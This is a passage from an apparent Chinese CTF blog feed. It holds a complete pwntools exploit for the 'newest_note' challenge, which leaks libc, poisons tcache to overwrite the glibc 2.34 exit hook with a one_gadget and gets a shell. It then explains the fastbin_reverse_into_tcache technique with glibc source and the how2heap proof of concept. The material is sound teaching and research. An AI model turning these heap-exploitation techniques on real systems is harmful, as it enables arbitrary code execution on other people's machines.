class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">libc_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x218cc0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0xeeccc execve(&quot;/bin/sh&quot;, r15, r12)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [r12] == NULL || r12 == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xeeccf execve(&quot;/bin/sh&quot;, r15, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xeecd2 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">one_gadget = libc_base + <span class="number">0xeeccc</span></span><br><span class="line">libc_atexit = libc_base + <span class="number">0x21a6c8</span> - <span class="number">8</span></span><br><span class="line">create(<span class="number">30</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span> + p64(libc_atexit ^ key))</span><br><span class="line">create(<span class="number">31</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">create(<span class="number">32</span>, p64(<span class="number">0</span>) + p64(one_gadget))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;4. Exit&#x27;</span>)</span><br><span class="line">gdb.attach(</span><br><span class="line">    r,</span><br><span class="line">    <span class="string">&#x27;b*$rebase(0x169A)\nb _int_malloc\ndir /ctf/work/download/glibc-2.34/malloc&#x27;</span></span><br><span class="line">)</span><br><span class="line">r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="在mmap生成chunk的情况下"><a href="#在mmap生成chunk的情况下" class="headerlink" title="在mmap生成chunk的情况下"></a>在mmap生成chunk的情况下</h3><h4 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h4><p>在这个情况下其实就更加简单了，因为这里直接泄露了libc地址，所以我们不需要想上面那样构造fake tcache，我们只需要拿到double free即可，这里因为可以直接少用一次free所以我们可以直接在fastbin当中进行double free。</p><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./newest_note&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./newest_note&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;4. Exit&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;4. Exit&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;4. Exit&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ROL</span>(<span class="params">content, key</span>):</span></span><br><span class="line">    tmp = <span class="built_in">bin</span>(content)[<span class="number">2</span>:].rjust(<span class="number">64</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(tmp[key:] + tmp[:key], <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;How many pages your notebook will be? :&#x27;</span>)</span><br><span class="line">r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="number">0x40040000</span>), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">show(<span class="number">0x8339a</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">libc_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x218cc0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    create(i, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">key = u64(r.recv(<span class="number">5</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(key))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    create(i, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">one_gadget = libc_base + <span class="number">0xeeccc</span></span><br><span class="line">libc_atexit = libc_base + <span class="number">0x21a6c8</span> - <span class="number">8</span></span><br><span class="line">create(<span class="number">7</span>, p64(libc_atexit ^ key))</span><br><span class="line">create(<span class="number">8</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">create(<span class="number">8</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">create(<span class="number">9</span>, p64(<span class="number">0</span>) + p64(one_gadget))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;4. Exit&#x27;</span>)</span><br><span class="line">gdb.attach(</span><br><span class="line">    r,</span><br><span class="line">    <span class="string">&#x27;b*$rebase(0x169A)\nb _int_malloc\ndir /ctf/work/download/glibc-2.34/malloc&#x27;</span></span><br><span class="line">)</span><br><span class="line">r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这里从源码层面解释了两种exit_hook，并且在例题中两种方式都是使用了，国赛的这道题目是很简单的，我也想到第一种方法了，不过就是因为存在知识点的遗漏导致没做出来，也是在看了wp之后才了解了exit_hook，所以基础知识还是很重要不然思路会受到限制。第一道例题如果有需要可以评论。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;众所周知的俩hook在glibc2.34移除了，不过exit_hook好像在这个版本的glibc表现得也不是很佳，不过在近期遇到的两道题目都需要用到这方面的知识所以来补了。&lt;/p&gt;
&lt;h2 id=&quot;exit-hook&quot;&gt;&lt;a href=&quot;#exit-hook&quot; class=</summary>
      
    
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/categories/pwn/"/>
    
    
    <category term="堆利用" scheme="https://cv196082.gitee.io/tags/%E5%A0%86%E5%88%A9%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>fastbin_reverse_into_tcache</title>
    <link href="https://cv196082.gitee.io/2022/05/26/fastbin-reverse-into-tcache/"/>
    <id>https://cv196082.gitee.io/2022/05/26/fastbin-reverse-into-tcache/</id>
    <published>2022-05-26T06:11:52.000Z</published>
    <updated>2022-05-26T06:11:29.000Z</updated>
    
    <content type="html"><![CDATA[<p>这一利用方式是一种类似于unsorted bin，<a href="https://cv196082.gitee.io/2022/02/24/tcache-stashing-unlink-attack/">tcache stashing unlink attack</a>可以在任意地址写入堆地址的漏洞。</p><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))</span><br><span class="line">&#123;</span><br><span class="line">    idx = fastbin_index (nb);</span><br><span class="line">    mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">    mchunkptr pp;</span><br><span class="line">    victim = *fb;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (victim != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">            *fb = victim-&gt;fd;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            REMOVE_FB (fb, pp, victim);</span><br><span class="line">        <span class="keyword">if</span> (__glibc_likely (victim != <span class="literal">NULL</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">size_t</span> victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line">            <span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">                malloc_printerr (<span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>);</span><br><span class="line">            check_remalloced_chunk (av, victim, nb);</span><br><span class="line">            <span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">            <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment"> stash them in the tcache.  */</span></span><br><span class="line">            <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">            <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">            &#123;</span><br><span class="line">                mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">                <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">                       &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">                        *fb = tc_victim-&gt;fd;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">                        <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    tcache_put (tc_victim, tc_idx);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">            alloc_perturb (p, bytes);</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在源码中，如果tcache不为空，那么就会从fastbin的fd指针指向的chunk开始往tcache内放入chunk。如果我们能够将最后一个堆地址的fd指针改成我们的目标地址即可实现任意地址写了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的写功能还是在放入tcache的函数内完成的，可以看到其实是写了两个指针的。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220526135149147.png"                      alt="image-20220526135149147"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220526135242008.png"                      alt="image-20220526135242008"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220526135305850.png"                      alt="image-20220526135305850"                ></p><p>最后实现这样</p><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p>这里的poc是how2heap当中的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">size_t</span> allocsize = <span class="number">0x40</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;This attack is intended to have a similar effect to the unsorted_bin_attack,\n&quot;</span></span><br><span class="line">    <span class="string">&quot;except it works with a small allocation size (allocsize &lt;= 0x78).\n&quot;</span></span><br><span class="line">    <span class="string">&quot;The goal is to set things up so that a call to malloc(allocsize) will write\n&quot;</span></span><br><span class="line">    <span class="string">&quot;a large unsigned value to the stack.\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Allocate 14 times so that we can free later.</span></span><br><span class="line">  <span class="keyword">char</span>* ptrs[<span class="number">14</span>];</span><br><span class="line">  <span class="keyword">size_t</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">    ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;First we need to free(allocsize) at least 7 times to fill the tcache.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;(More than 7 times works fine too.)\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fill the tcache.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span>* victim = ptrs[<span class="number">7</span>];</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;The next pointer that we free is the chunk that we&#x27;re going to corrupt: %p\n&quot;</span></span><br><span class="line">    <span class="string">&quot;It doesn&#x27;t matter if we corrupt it now or later. Because the tcache is\n&quot;</span></span><br><span class="line">    <span class="string">&quot;already full, it will go in the fastbin.\n\n&quot;</span>,</span><br><span class="line">    victim</span><br><span class="line">  );</span><br><span class="line">  <span class="built_in">free</span>(victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;Next we need to free between 1 and 6 more pointers. These will also go\n&quot;</span></span><br><span class="line">    <span class="string">&quot;in the fastbin. If the stack address that we want to overwrite is not zero\n&quot;</span></span><br><span class="line">    <span class="string">&quot;then we need to free exactly 6 more pointers, otherwise the attack will\n&quot;</span></span><br><span class="line">    <span class="string">&quot;cause a segmentation fault. But if the value on the stack is zero then\n&quot;</span></span><br><span class="line">    <span class="string">&quot;a single free is sufficient.\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fill the fastbin.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">8</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Create an array on the stack and initialize it with garbage.</span></span><br><span class="line">  <span class="keyword">size_t</span> stack_var[<span class="number">6</span>];</span><br><span class="line">  <span class="built_in">memset</span>(stack_var, <span class="number">0xcd</span>, <span class="keyword">sizeof</span>(stack_var));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;The stack address that we intend to target: %p\n&quot;</span></span><br><span class="line">    <span class="string">&quot;It&#x27;s current value is %p\n&quot;</span>,</span><br><span class="line">    &amp;stack_var[<span class="number">2</span>],</span><br><span class="line">    (<span class="keyword">char</span>*)stack_var[<span class="number">2</span>]</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;Now we use a vulnerability such as a buffer overflow or a use-after-free\n&quot;</span></span><br><span class="line">    <span class="string">&quot;to overwrite the next pointer at address %p\n\n&quot;</span>,</span><br><span class="line">    victim</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Overwrite linked list pointer in victim.</span></span><br><span class="line">  *(<span class="keyword">size_t</span>**)victim = &amp;stack_var[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;The next step is to malloc(allocsize) 7 times to empty the tcache.\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Empty tcache.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">    ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;Let&#x27;s just print the contents of our array on the stack now,\n&quot;</span></span><br><span class="line">    <span class="string">&quot;to show that it hasn&#x27;t been modified yet.\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="keyword">char</span>*)stack_var[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;The next allocation triggers the stack to be overwritten. The tcache\n&quot;</span></span><br><span class="line">    <span class="string">&quot;is empty, but the fastbin isn&#x27;t, so the next allocation comes from the\n&quot;</span></span><br><span class="line">    <span class="string">&quot;fastbin. Also, 7 chunks from the fastbin are used to refill the tcache.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Those 7 chunks are copied in reverse order into the tcache, so the stack\n&quot;</span></span><br><span class="line">    <span class="string">&quot;address that we are targeting ends up being the first chunk in the tcache.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;It contains a pointer to the next chunk in the list, which is why a heap\n&quot;</span></span><br><span class="line">    <span class="string">&quot;pointer is written to the stack.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Earlier we said that the attack will also work if we free fewer than 6\n&quot;</span></span><br><span class="line">    <span class="string">&quot;extra pointers to the fastbin, but only if the value on the stack is zero.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;That&#x27;s because the value on the stack is treated as a next pointer in the\n&quot;</span></span><br><span class="line">    <span class="string">&quot;linked list and it will trigger a crash if it isn&#x27;t a valid pointer or null.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;The contents of our array on the stack now look like this:\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="built_in">malloc</span>(allocsize);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="keyword">char</span>*)stack_var[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> *q = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;Finally, if we malloc one more time then we get the stack address back: %p\n&quot;</span>,</span><br><span class="line">    q</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  assert(q == (<span class="keyword">char</span> *)&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span 